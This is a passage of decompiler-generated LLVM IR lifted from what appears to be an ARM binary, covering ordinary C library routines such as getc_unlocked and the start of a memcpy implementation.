  uselistorder i32 %v3_14870, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1481c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_14810, { 1, 2, 0 }
  uselistorder i32 %v0_14810, { 1, 0 }
  uselistorder i32 %v1_14818.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_147d0, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_147cc, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_14790, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14784, { 3, 0, 1, 2 }
  uselistorder i32 %v2_14760, { 1, 0 }
  uselistorder i32 %v1_14760, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1475c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_14754, { 1, 0 }
  uselistorder i32 %v0_1474c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_14734, { 1, 0 }
  uselistorder i32 %v1_14710, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14710, { 1, 0, 2 }
  uselistorder i32 %v1_146ec, { 0, 2, 1 }
  uselistorder i32 %v0_146e8, { 3, 0, 1, 2 }
  uselistorder i1 %v2_146cc, { 2, 1, 0 }
  uselistorder i32 %v2_14624, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_14614, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_146b8, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_145c0, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_145a8, { 1, 0 }
  uselistorder i32 %v2_145a0, { 1, 2, 0 }
  uselistorder i32 %v1_14594, { 1, 0 }
  uselistorder i32 %v0_14594, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_1458c, { 1, 0, 2 }
  uselistorder i32 %v0_14584, { 3, 0, 1, 2 }
  uselistorder i1 %v3_14568, { 1, 0 }
  uselistorder i32 %v2_14568, { 1, 0 }
  uselistorder i32 %v2_14564, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_14550, { 1, 0 }
  uselistorder i32 %v1_14554, { 2, 1, 0 }
  uselistorder i1 %v2_14544, { 1, 0 }
  uselistorder i32 %v0_14540, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_14528, { 1, 0 }
  uselistorder i32 %v1_1451c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_144d4, { 1, 2, 0 }
  uselistorder i32 %v2_144d0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_144d0, { 1, 0, 2 }
  uselistorder i1 %v2_144bc, { 1, 0 }
  uselistorder i32 %v0_144b4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_144c4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_144a4, { 1, 0 }
  uselistorder i32 %v0_14494, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_1448c, { 1, 0 }
  uselistorder i1 %v5_1448c, { 1, 0 }
  uselistorder i32 %v0_14488, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1447c, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_14478, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_1442c, { 1, 0 }
  uselistorder i32 %v3_1442c, { 1, 0 }
  uselistorder i32 %v0_14360, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_14298, { 0, 1, 3, 2 }
  uselistorder i32 %v1_14294, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 8, 2, 3, 9, 4, 5, 6, 7 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 12, 9, 4, 10, 11, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 43, 26, 27, 31, 28, 29, 30, 32, 1, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 52, 44, 45, 53, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 16, 19, 18, 17, 9, 10, 15, 11, 12, 13, 20, 14, 0, 21, 22, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 10, 8, 9, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 50, 18, 19, 20, 21, 22, 23, 24, 25, 49, 26, 27, 28, 29, 30, 48, 31, 32, 33, 34, 35, 36, 37, 51, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 48, 17, 18, 19, 20, 21, 22, 23, 24, 25, 47, 26, 27, 28, 29, 46, 30, 31, 32, 33, 34, 35, 36, 45, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 50, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 17, { 13, 0, 3, 4, 1, 5, 6, 15, 14, 7, 8, 9, 2, 10, 11, 12 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i8 69, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_148a4, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_1480c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14784, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1475c, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_14734, { 1, 0 }
  uselistorder label %dec_label_pc_14710, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146c4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_145e8, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_145d8, { 1, 0 }
  uselistorder label %dec_label_pc_145cc, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_144f4, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_148ec = load i32, i32* @r4, align 4
  store i32 %v3_148ec, i32* %stack_var_-8, align 4
  %v0_148f0 = load i32, i32* @r0, align 4
  %v1_148f0 = add i32 %v0_148f0, 16
  %v2_148f0 = inttoptr i32 %v1_148f0 to i32*
  %v3_148f0 = load i32, i32* %v2_148f0, align 4
  store i32 %v3_148f0, i32* %r2.global-to-local, align 4
  %v1_148f4 = add i32 %v0_148f0, 24
  %v2_148f4 = inttoptr i32 %v1_148f4 to i32*
  %v3_148f4 = load i32, i32* %v2_148f4, align 4
  %v3_148f8 = icmp ult i32 %v3_148f0, %v3_148f4
  store i32 %v0_148f0, i32* @r4, align 4
  br i1 %v3_148f8, label %bb, label %dec_label_pc_14910

bb:                                               ; preds = %entry
  %v2_14900 = inttoptr i32 %v3_148f0 to i8*
  %v3_14900 = load i8, i8* %v2_14900, align 1
  %v4_14900 = zext i8 %v3_14900 to i32
  store i32 %v4_14900, i32* %r0.global-to-local, align 4
  %v6_14900 = add i32 %v3_148f0, 1
  store i32 %v6_14900, i32* %r2.global-to-local, align 4
  store i32 %v6_14900, i32* %v2_148f0, align 4
  br label %dec_label_pc_14a10

dec_label_pc_14910:                               ; preds = %entry
  %v1_14910 = inttoptr i32 %v0_148f0 to i8*
  %v2_14910 = load i8, i8* %v1_14910, align 1
  %v3_14910 = zext i8 %v2_14910 to i32
  %v1_14914 = and i32 %v3_14910, 131
  %tmp22 = icmp ugt i32 %v1_14914, 128
  br i1 %tmp22, label %dec_label_pc_14930, label %dec_label_pc_14920

dec_label_pc_14920:                               ; preds = %dec_label_pc_14910
  store i32 128, i32* @r1, align 4
  %v0_14924 = call i32 @__stdio_trans2r_o()
  store i32 %v0_14924, i32* %r0.global-to-local, align 4
  %v2_14928 = icmp eq i32 %v0_14924, 0
  br i1 %v2_14928, label %dec_label_pc_14920.dec_label_pc_14930_crit_edge, label %dec_label_pc_14a0c

dec_label_pc_14920.dec_label_pc_14930_crit_edge:  ; preds = %dec_label_pc_14920
  %v0_14930.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14930

dec_label_pc_14930:                               ; preds = %dec_label_pc_14920.dec_label_pc_14930_crit_edge, %dec_label_pc_14910
  %v2_1497c = phi i32 [ %v0_14930.pre, %dec_label_pc_14920.dec_label_pc_14930_crit_edge ], [ %v0_148f0, %dec_label_pc_14910 ]
  %v1_14930 = inttoptr i32 %v2_1497c to i8*
  %v2_14930 = load i8, i8* %v1_14930, align 1
  %v3_14930 = zext i8 %v2_14930 to i32
  store i32 %v3_14930, i32* %r2.global-to-local, align 4
  %v1_14934 = add i32 %v2_1497c, 1
  %v2_14934 = inttoptr i32 %v1_14934 to i8*
  %v3_14934 = load i8, i8* %v2_14934, align 1
  %v4_14934 = zext i8 %v3_14934 to i32
  %v4_14938 = mul nuw nsw i32 %v4_14934, 256
  %v5_14938 = or i32 %v4_14938, %v3_14930
  store i32 %v5_14938, i32* %r2.global-to-local, align 4
  %v1_1493c = and i32 %v3_14930, 2
  %v2_1493c = icmp eq i32 %v1_1493c, 0
  br i1 %v2_1493c, label %dec_label_pc_1496c, label %dec_label_pc_14944

dec_label_pc_14944:                               ; preds = %dec_label_pc_14930
  %tmp23 = urem i8 %v2_14930, 2
  %v1_14944 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_14944
  %v4_14948 = and i32 %tmp18, 4
  %v5_14948 = add i32 %v4_14948, %v2_1497c
  %v1_1494c = add i32 %v5_14948, 36
  %v2_1494c = inttoptr i32 %v1_1494c to i8*
  %v3_1494c = load i8, i8* %v2_1494c, align 1
  %v4_1494c = zext i8 %v3_1494c to i32
  %v1_14950 = add nsw i32 %v5_14938, -1
  store i32 %v1_14950, i32* %r2.global-to-local, align 4
  %v3_14954 = sdiv i32 %v1_14950, 256
  store i32 %v3_14954, i32* %r1.global-to-local, align 4
  store i32 %v4_1494c, i32* %r0.global-to-local, align 4
  %v2_14960 = add i32 %v2_1497c, 40
  %v3_14960 = inttoptr i32 %v2_14960 to i32*
  store i32 0, i32* %v3_14960, align 4
  %v0_14964 = load i32, i32* %r1.global-to-local, align 4
  %v1_14964 = trunc i32 %v0_14964 to i8
  %v2_14964 = load i32, i32* @r4, align 4
  %v3_14964 = add i32 %v2_14964, 1
  %v4_14964 = inttoptr i32 %v3_14964 to i8*
  store i8 %v1_14964, i8* %v4_14964, align 1
  br label %dec_label_pc_149a0

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14930
  %v1_1496c = add i32 %v2_1497c, 16
  store i32 %v1_1496c, i32* %r1.global-to-local, align 4
  %v1_14970 = inttoptr i32 %v1_1496c to i32*
  %v2_14970 = load i32, i32* %v1_14970, align 4
  store i32 %v2_14970, i32* %r1.global-to-local, align 4
  %v3_14970 = add i32 %v2_1497c, 20
  %v4_14970 = inttoptr i32 %v3_14970 to i32*
  %v5_14970 = load i32, i32* %v4_14970, align 4
  %v9_14974 = icmp eq i32 %v5_14970, %v2_14970
  br i1 %v9_14974, label %dec_label_pc_14984, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1496c
  %v2_14978 = inttoptr i32 %v2_14970 to i8*
  %v3_14978 = load i8, i8* %v2_14978, align 1
  %v4_14978 = zext i8 %v3_14978 to i32
  store i32 %v4_14978, i32* %r0.global-to-local, align 4
  %v6_14978 = add i32 %v2_14970, 1
  store i32 %v6_14978, i32* %r1.global-to-local, align 4
  store i32 %v6_14978, i32* %v1_14970, align 4
  br label %dec_label_pc_14a10

dec_label_pc_14984:                               ; preds = %dec_label_pc_1496c
  %v1_14984 = add i32 %v2_1497c, 4
  %v2_14984 = inttoptr i32 %v1_14984 to i32*
  %v3_14984 = load i32, i32* %v2_14984, align 4
  %v4_1498c = icmp eq i32 %v3_14984, -2
  br i1 %v4_1498c, label %dec_label_pc_14990, label %dec_label_pc_149a8

dec_label_pc_14990:                               ; preds = %dec_label_pc_14984
  %v1_14990 = or i32 %v5_14938, 4
  store i32 %v1_14990, i32* %r2.global-to-local, align 4
  store i8 %v3_14934, i8* %v2_14934, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_149a0

dec_label_pc_149a0:                               ; preds = %dec_label_pc_14944, %dec_label_pc_14990
  %v0_149a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_149a0 = trunc i32 %v0_149a0 to i8
  %v2_149a0 = load i32, i32* @r4, align 4
  %v3_149a0 = inttoptr i32 %v2_149a0 to i8*
  store i8 %v1_149a0, i8* %v3_149a0, align 1
  br label %dec_label_pc_14a10

dec_label_pc_149a8:                               ; preds = %dec_label_pc_14984
  %v1_149a8 = and i32 %v4_14938, 768
  %v2_149a8 = icmp eq i32 %v1_149a8, 0
  br i1 %v2_149a8, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_149a8
  store i32 ptrtoint (i32** @global_var_22508.331 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_149a8, %bb19
  store i32 84404, i32* @lr, align 4
  %v1_149b0 = xor i1 %v2_149a8, true
  call void @__pseudo_cond_branch(i1 %v1_149b0, i32 ptrtoint (i32* @global_var_112d8.572 to i32))
  %v0_149b4 = load i32, i32* @r4, align 4
  %v1_149b4 = add i32 %v0_149b4, 8
  store i32 %v1_149b4, i32* %r2.global-to-local, align 4
  %v1_149b8 = inttoptr i32 %v1_149b4 to i32*
  %v2_149b8 = load i32, i32* %v1_149b8, align 4
  store i32 %v2_149b8, i32* %r2.global-to-local, align 4
  %v3_149b8 = add i32 %v0_149b4, 12
  %v4_149b8 = inttoptr i32 %v3_149b8 to i32*
  %v5_149b8 = load i32, i32* %v4_149b8, align 4
  %v9_149bc = icmp eq i32 %v5_149b8, %v2_149b8
  br i1 %v9_149bc, label %dec_label_pc_149f0, label %dec_label_pc_149c4

dec_label_pc_149c4:                               ; preds = %bb20
  %v2_149c4 = add i32 %v0_149b4, 24
  %v3_149c4 = inttoptr i32 %v2_149c4 to i32*
  store i32 %v2_149b8, i32* %v3_149c4, align 4
  %v0_149c8 = load i32, i32* @r4, align 4
  store i32 %v0_149c8, i32* %r0.global-to-local, align 4
  %v2_149cc = call i32 @__stdio_rfill(i32 %v0_149c8)
  store i32 %v2_149cc, i32* %r0.global-to-local, align 4
  %v2_149d0 = icmp eq i32 %v2_149cc, 0
  br i1 %v2_149d0, label %dec_label_pc_14a0c, label %dec_label_pc_149d8

dec_label_pc_149d8:                               ; preds = %dec_label_pc_149c4
  %v0_149d8 = load i32, i32* @r4, align 4
  %v1_149d8 = add i32 %v0_149d8, 20
  %v2_149d8 = inttoptr i32 %v1_149d8 to i32*
  %v3_149d8 = load i32, i32* %v2_149d8, align 4
  %v2_149dc = add i32 %v0_149d8, 24
  %v3_149dc = inttoptr i32 %v2_149dc to i32*
  store i32 %v3_149d8, i32* %v3_149dc, align 4
  %v0_149e0 = load i32, i32* @r4, align 4
  %v1_149e0 = add i32 %v0_149e0, 16
  %v2_149e0 = inttoptr i32 %v1_149e0 to i32*
  %v3_149e0 = load i32, i32* %v2_149e0, align 4
  %v1_149e4 = inttoptr i32 %v3_149e0 to i8*
  %v2_149e4 = load i8, i8* %v1_149e4, align 1
  %v3_149e4 = zext i8 %v2_149e4 to i32
  store i32 %v3_149e4, i32* %r0.global-to-local, align 4
  %v5_149e4 = add i32 %v3_149e0, 1
  store i32 %v5_149e4, i32* %v2_149e0, align 4
  br label %dec_label_pc_14a10

dec_label_pc_149f0:                               ; preds = %bb20
  %v1_149f0 = inttoptr i32 %v0_149b4 to i8*
  store i32 %v0_149b4, i32* %r0.global-to-local, align 4
  %v2_149f4 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_149f4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_149fc = call i32 @__stdio_READ(i8* %v1_149f0, i32 %v2_149f4, i32 1)
  store i32 %v5_149fc, i32* %r0.global-to-local, align 4
  %v2_14a00 = icmp eq i32 %v5_149fc, 0
  br i1 %v2_14a00, label %dec_label_pc_14a0c, label %bb21

bb21:                                             ; preds = %dec_label_pc_149f0
  %v4_14a04 = load i8, i8* %stack_var_-9, align 1
  %v5_14a04 = sext i8 %v4_14a04 to i32
  store i32 %v5_14a04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a10

dec_label_pc_14a0c:                               ; preds = %dec_label_pc_149f0, %dec_label_pc_14920, %dec_label_pc_149c4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a10

dec_label_pc_14a10:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_149d8, %dec_label_pc_149a0, %dec_label_pc_14a0c
  %v2_14a14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14a14, i32* @r4, align 4
  %v8_14a14 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_14a14

; uselistorder directives
  uselistorder i32 %v2_14970, { 1, 0, 2, 3 }
  uselistorder i32 %v3_14930, { 1, 0, 2 }
  uselistorder i32 %v2_1497c, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_148f0, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_22540.298, { 2, 1, 0 }
  uselistorder i32** @global_var_22508.331, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14a10, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_14a0c, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_149a0, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_14a20 = load i32, i32* @r1, align 4
  %v1_14a20 = load i32, i32* %r0.global-to-local, align 4
  %v2_14a20 = sub i32 %v0_14a20, %v1_14a20
  %v3_14a20 = icmp ult i32 %v0_14a20, %v1_14a20
  %v4_14a20 = xor i32 %v1_14a20, %v0_14a20
  %v5_14a20 = xor i32 %v2_14a20, %v0_14a20
  %v6_14a20 = and i32 %v5_14a20, %v4_14a20
  %v7_14a20 = icmp slt i32 %v6_14a20, 0
  store i1 %v7_14a20, i1* %cpsr_v.global-to-local, align 1
  %v8_14a20 = icmp slt i32 %v2_14a20, 0
  store i1 %v8_14a20, i1* %cpsr_n.global-to-local, align 1
  %v9_14a20 = icmp eq i32 %v0_14a20, %v1_14a20
  store i1 %v9_14a20, i1* @cpsr_z, align 1
  br i1 %v3_14a20, label %dec_label_pc_14c6c, label %dec_label_pc_14a28

dec_label_pc_14a28:                               ; preds = %entry
  br i1 %v9_14a20, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_14a28
  %merge = phi i32 [ %v0_14a20, %dec_label_pc_14a28 ], [ %v2_14d00, %bb143 ], [ %v11_14d1c, %bb146 ], [ %v7_14d1c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_14a28
  %v5_14a2c = inttoptr i32 %v1_14a20 to i8*
  store i8* %v5_14a2c, i8** %stack_var_-8, align 4
  %v0_14a30 = load i32, i32* @r2, align 4
  %v2_14a30 = add i32 %v0_14a30, -4
  store i32 %v2_14a30, i32* %r2.global-to-local, align 4
  %v4_14a30 = sub i32 3, %v0_14a30
  %v5_14a30 = and i32 %v4_14a30, %v0_14a30
  %v6_14a30 = icmp slt i32 %v5_14a30, 0
  store i1 %v6_14a30, i1* %cpsr_v.global-to-local, align 1
  %v7_14a30 = icmp slt i32 %v2_14a30, 0
  store i1 %v7_14a30, i1* %cpsr_n.global-to-local, align 1
  %v5_14a34 = icmp slt i32 %v0_14a30, 4
  br i1 %v5_14a34, label %bb133, label %dec_label_pc_14a38

dec_label_pc_14a38:                               ; preds = %bb
  %v1_14a38 = urem i32 %v1_14a20, 4
  store i32 %v1_14a38, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14a38 = icmp eq i32 %v1_14a38, 0
  br i1 %v2_14a38, label %dec_label_pc_14a40, label %dec_label_pc_14ae4

dec_label_pc_14a40:                               ; preds = %dec_label_pc_14a38
  %v1_14a40 = urem i32 %v0_14a20, 4
  store i32 %v1_14a40, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14a40 = icmp eq i32 %v1_14a40, 0
  %extract.t = trunc i32 %v0_14a20 to i2
  br i1 %v2_14a40, label %dec_label_pc_14a48, label %dec_label_pc_14b14

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a40, %dec_label_pc_14b0c
  %v0_14a6093 = phi i32 [ %v1_14a20, %dec_label_pc_14a40 ], [ %v0_14b5c76, %dec_label_pc_14b0c ]
  %v0_14a5c92 = phi i32 [ %v0_14a20, %dec_label_pc_14a40 ], [ %v0_14b0c, %dec_label_pc_14b0c ]
  %v0_14a48 = phi i32 [ %v2_14a30, %dec_label_pc_14a40 ], [ %v2_14b04, %dec_label_pc_14b0c ]
  %v2_14a48 = add i32 %v0_14a48, -8
  store i32 %v2_14a48, i32* %r2.global-to-local, align 4
  %v4_14a48 = sub i32 7, %v0_14a48
  %v5_14a48 = and i32 %v4_14a48, %v0_14a48
  %v6_14a48 = icmp slt i32 %v5_14a48, 0
  store i1 %v6_14a48, i1* %cpsr_v.global-to-local, align 1
  %v7_14a48 = icmp slt i32 %v2_14a48, 0
  store i1 %v7_14a48, i1* %cpsr_n.global-to-local, align 1
  %v5_14a4c = icmp slt i32 %v0_14a48, 8
  br i1 %v5_14a4c, label %dec_label_pc_14a9c, label %dec_label_pc_14a50

dec_label_pc_14a50:                               ; preds = %dec_label_pc_14a48
  %v2_14a50 = add i32 %v0_14a48, -28
  store i32 %v2_14a50, i32* %r2.global-to-local, align 4
  %v4_14a50 = sub i32 27, %v0_14a48
  %v5_14a50 = and i32 %v4_14a50, %v2_14a48
  %v6_14a50 = icmp slt i32 %v5_14a50, 0
  store i1 %v6_14a50, i1* %cpsr_v.global-to-local, align 1
  %v7_14a50 = icmp slt i32 %v2_14a50, 0
  store i1 %v7_14a50, i1* %cpsr_n.global-to-local, align 1
  %v5_14a54 = icmp slt i32 %v2_14a48, 20
  br i1 %v5_14a54, label %dec_label_pc_14a88, label %dec_label_pc_14a58

dec_label_pc_14a58:                               ; preds = %dec_label_pc_14a50
  %v0_14a58 = load i32, i32* @r4, align 4
  store i32 %v0_14a58, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14a5c

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge, %dec_label_pc_14a58
  %v0_14a60 = phi i32 [ %v12_14a68, %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge ], [ %v0_14a6093, %dec_label_pc_14a58 ]
  %v0_14a5c = phi i32 [ %v0_14a5c.pre, %dec_label_pc_14a5c.dec_label_pc_14a5c_crit_edge ], [ %v0_14a5c92, %dec_label_pc_14a58 ]
  %v1_14a5c = inttoptr i32 %v0_14a5c to i32*
  %v2_14a5c = load i32, i32* %v1_14a5c, align 4
  store i32 %v2_14a5c, i32* %r3.global-to-local, align 4
  %v3_14a5c = add i32 %v0_14a5c, 4
  %v4_14a5c = inttoptr i32 %v3_14a5c to i32*
  %v5_14a5c = load i32, i32* %v4_14a5c, align 4
  store i32 %v5_14a5c, i32* %r4.global-to-local, align 4
  %v6_14a5c = add i32 %v0_14a5c, 8
  %v7_14a5c = inttoptr i32 %v6_14a5c to i32*
  %v8_14a5c = load i32, i32* %v7_14a5c, align 4
  store i32 %v8_14a5c, i32* %ip.global-to-local, align 4
  %v9_14a5c = add i32 %v0_14a5c, 12
  %v10_14a5c = inttoptr i32 %v9_14a5c to i32*
  %v11_14a5c = load i32, i32* %v10_14a5c, align 4
  store i32 %v11_14a5c, i32* %lr.global-to-local, align 4
  %v12_14a5c = add i32 %v0_14a5c, 16
  store i32 %v12_14a5c, i32* %r1.global-to-local, align 4
  %v1_14a60 = inttoptr i32 %v0_14a60 to i32*
  store i32 %v2_14a5c, i32* %v1_14a60, align 4
  %v3_14a60 = add i32 %v0_14a60, 4
  %v4_14a60 = inttoptr i32 %v3_14a60 to i32*
  %v5_14a60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14a60, i32* %v4_14a60, align 4
  %v6_14a60 = add i32 %v0_14a60, 8
  %v7_14a60 = inttoptr i32 %v6_14a60 to i32*
  %v8_14a60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_14a60, i32* %v7_14a60, align 4
  %v9_14a60 = add i32 %v0_14a60, 12
  %v10_14a60 = inttoptr i32 %v9_14a60 to i32*
  %v11_14a60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14a60, i32* %v10_14a60, align 4
  %v12_14a60 = add i32 %v0_14a60, 16
  store i32 %v12_14a60, i32* %r0.global-to-local, align 4
  %v0_14a64 = load i32, i32* %r1.global-to-local, align 4
  %v1_14a64 = inttoptr i32 %v0_14a64 to i32*
  %v2_14a64 = load i32, i32* %v1_14a64, align 4
  store i32 %v2_14a64, i32* %r3.global-to-local, align 4
  %v3_14a64 = add i32 %v0_14a64, 4
  %v4_14a64 = inttoptr i32 %v3_14a64 to i32*
  %v5_14a64 = load i32, i32* %v4_14a64, align 4
  store i32 %v5_14a64, i32* %r4.global-to-local, align 4
